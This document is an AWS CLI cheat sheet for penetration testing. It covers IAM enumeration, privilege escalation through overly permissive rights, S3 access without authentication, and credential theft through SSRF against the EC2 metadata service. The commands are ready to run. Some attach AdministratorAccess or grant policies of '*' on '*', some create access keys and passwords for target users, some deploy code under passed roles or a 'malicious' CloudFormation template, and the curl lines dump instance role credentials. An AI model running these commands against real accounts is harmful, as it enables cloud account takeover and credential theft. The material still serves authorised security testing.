# AWS

% aws

## Configure AWS cli

```
aws configure
```

## Configure AWS cli for profile

```
aws configure --profile <profil>
```

## Configure AWS cli with temp credentials

```
export AWS_ACCESS_KEY_ID="<access_key_id>";
export AWS_SECRET_ACCESS_KEY="<secret_access_key>";
export AWS_SESSION_TOKEN="<session_token>";
```

## Listing IAM access Keys

```
aws iam list-access-keys
```

## Enumerating IAM users

### Checking credentials for the user

```
aws sts get-caller-identity
```

### Listing IAM Users

```
aws iam list-users
```

### Listing the IAM groups that the specified IAM user belongs to 

```
aws iam list-groups-for-user --user-name <user-name>
```

### Listing all managed policies that are attached to the specified IAM user 

```
aws iam list-attached-user-policies --user-name <user-name>
```

### Listing the names of the inline policies embedded in the specified IAM user 

```
aws iam list-user-policies --user-name <user-name>
```

### Listing IAM Groups

```
aws iam list-groups
```

### Listing all managed policies that are attached to the specified IAM Group 

```
aws iam list-attached-group-policies --group-name <group-name>
```

### Listing the names of the inline policies embedded in the specified IAM Group

```
aws iam list-group-policies --group-name <group-name>
```

### Listing IAM Roles

```
aws iam list-roles
```

### Listing all managed policies that are attached to the specified IAM role 

```
aws iam list-attached-role-policies --role-name  <role-name>
```

### Listing the names of the inline policies embedded in the specified IAM role 

```
aws iam list-role-policies --role-name <role-name>
```

### Listing of IAM Policies

```
aws iam list-policies
```

### Retrieving information about the specified managed policy 

```
aws iam get-policy --policy-arn <policy-arn>
```

### Listing information about the versions of the specified manages policy 

```
aws iam list-policy-versions --policy-arn <policy-arn>
```

### Retrieving information about the specific version of the specified managed policy 

```
aws iam get-policy-version --policy-arn <policy-arn> --version-id <version-id>
```

### Retrieving the specified inline policy document that is embedded on the specified IAM user

```
aws iam get-user-policy --user-name <user-name> --policy-name <policy-name>
```

### Retrieving the specified inline policy document that is embedded on the specified group

```
aws iam get-group-policy --group-name <group-name> --policy-name <policy-name>
```

### Retrieving the specified inline policy document that is embedded on the specified role 

```
aws iam get-role-policy --role-name  <role-name> --policy-name <policy-name>
```

## Privesc with overly permissive right

### PACU - Scan for IAM Privesc

```
run iam__privesc_scan
```

### Abuse iam:CreatePolicyVersion permission

```
aws iam create-policy-version --policy-arn <policy-arn> --policy-document '{"Version": "2012-10-17", "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]}'
```

### Abuse iam:SetDefaultPolicyVersion

```
aws iam set-default-policy-version --policy-arn <policy-arn> --version-id <vX>
```

### Creating an EC2 instance with an existing instance profile - iam:PassRole & ec2:RunInstances

```
aws ec2 run-instances --image-id <image-id> --instance-type t2.micro --iam-instance-profile Name=<instance-profile> --key-name <my_ssh_key> --security-group-ids <security-groups-ids>
```

### Creating user access key - iam:CreateAccessKey

```
aws iam create-access-key --user-name <target_user>
```

### Creating a new login profile - iam:CreateLoginProfile

```
aws iam create-login-profile --user-name <target_user> --password '<password>' --no-password-reset-required
```

### Updating an existing login profile - iam:UpdateLoginProfile

```
aws iam update-login-profile --user-name <target_user> --password '<password>' --no-password-reset-required
```

### Abuse iam:AttachUserPolicy

```
aws iam attach-user-policy --user-name <target_user> --policy-arn 'arn:aws:iam::aws:policy/AdministratorAccess'
```

### Abuse iam:AttachGroupPolicy

```
aws iam attach-group-policy --group-name <my_group> --policy-arn 'arn:aws:iam::aws:policy/AdministratorAccess'
```

### Abuse iam:AttachRolePolicy

```
aws iam attach-role-policy --role-name <my_role> --policy-arn 'arn:aws:iam::aws:policy/AdministratorAccess'
```

### Abuse creating/updating an inline policy - iam:PutUserPolicy

```
aws iam put-user-policy --user-name <user-name> --policy-name <policy-name-random> --policy-document '{"Version": "2012-10-17", "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]}'
```

### Abuse creating/updating an inline policy - iam:PutGroupPolicy

```
aws iam put-group-policy --group-name <my-group> --policy-name <policy-name-random> --policy-document '{"Version": "2012-10-17", "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]}'
```

### Abuse creating/updating an inline policy - iam:PutRolePolicy

```
aws iam put-role-policy --role-name <my-role> --policy-name <policy-name-random> --policy-document '{"Version": "2012-10-17", "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]}'
```

### Adding a user to a group - iam:AddUserToGroup

```
aws iam add-user-to-group --group-name <target_group> --user-name <user-name>
```

### Abuse iam:UpdateAssumeRolePolicy & sts:AssumeRole 

```
aws iam update-assume-role-policy --role-name <target-role> --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow",
"Principal":{"AWS":"arn:aws:iam::<account-id>:user/<user-name>"},"Action":["sts:AssumeRole"]}]}'
```

### Passing a role to a new Lambda function, then invoking it

```
aws lambda create-function --function-name <my_function> --runtime python3.6 --role <arn_of_lambda_role> --handler lambda_function.lambda_handler --code file://<my_python_code.py>
```

### Passing a role to a new Lambda function, then triggering it with DynamoDB

```
aws lambda create-function --function-name <my_function> --runtime python3.6 --role <arn_of_lambda_role> --handler lambda_function.lambda_handler --code file://<my_python_code.py>;

aws dynamodb create-table --table-name <my_table> --attribute-definitions AttributeName=Test,AttributeType=S --key-schema AttributeName=Test,KeyType=HASH --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 --stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES;

aws lambda create-event-source-mapping --function-name <my_function> --event-source-arn arn_of_dynamodb_table_stream --enabled --starting-position LATEST;

aws dynamodb put-item --table-name <my_table> --item Test={S=”Random string”}
```

### Updating the code of an existing Lambda function - lambda:UpdateFunctionCode

```
aws lambda update-function-code --function-name <target-function> --code fileb://<my/pythontocode.zip>;
```

### Abuse glue:CreateDevEndpoint & iam:PassRole 

```
aws glue create-dev-endpoint --endpoint-name <new_dev_endpoint> --role-arn <arn_of_glue_service_role> --public-key file://<path/to/my/public/ssh/key.pub>
```

### Abuse glue:UpdateDevEndpoint

```
aws glue --endpoint-name <target_endpoint> --public-key file://<path/to/my/public/ssh/key.pub>
```

### Abuse cloudformation:CreateStack & iam:PassRole

```
aws cloudformation create-stack --stack-name <my_stack> --template-url http://<my-website.com/my-malicious-template.template> --role-arn <arn_of_cloudformation_service_role>
```

### Passing a role to Data Pipeline

```
aws datapipeline create-pipeline --name my_pipeline --unique-id <unique_string>;

aws datapipeline put-pipeline-definition --pipeline-id <unique_string> --pipeline-definition file://<path/to/my/pipeline/definition.json>
```

## Bucket S3

### List s3 recursively 

```
aws s3 ls s3://<bucket_name> --recursive
```

### List s3 - no authent

```
aws s3 ls s3://<bucket_name> --no-sign-request
```

### Get file 

```
aws s3 cp s3://<bucket_name>/<file> <local_file>
```

### Put file

```
aws s3 cp <local_file> s3://<bucket_name>/<file>
```

## SSRF in EC2

## SSRF in EC2 - List roles
#plateform/linux #target/remote #protocol/http #port/80 #cat/RECON
```
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

## SSRF in EC2 - Dump roles
#plateform/linux #target/remote #protocol/http #port/80 #cat/RECON
```
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role_name>
```

## Assume role

```
aws sts assume-role --role-arn <arn> --role-session-name <sess_name>
```

## Enumerate AWS organization

### List organizations

```
aws organizations describe-organization
```